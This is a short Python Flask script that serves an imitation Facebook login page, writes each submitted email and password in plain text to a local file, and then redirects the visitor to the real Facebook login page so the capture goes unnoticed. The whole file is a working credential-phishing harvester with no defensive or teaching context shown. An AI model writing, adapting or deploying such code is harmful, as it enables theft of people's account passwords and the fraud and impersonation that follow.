from flask import Flask, request, render_template, redirect

app = Flask(__name__)

@app.route("/", methods=['GET','POST'])
def get_data():
    if request.method == "GET":
        return render_template("Facebook – entre ou cadastre-se.html")
    elif request.method == "POST":
        
        data = request.form['email'] + " " + request.form['password']
        file = open('data.txt','a')
        file.write(str(data) +' '+"\n")
        file.close()


        return redirect("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110")
    else:
        return render_template("Facebook – entre ou cadastre-se.html")


if __name__=="__main__":
    app.run(debug=True)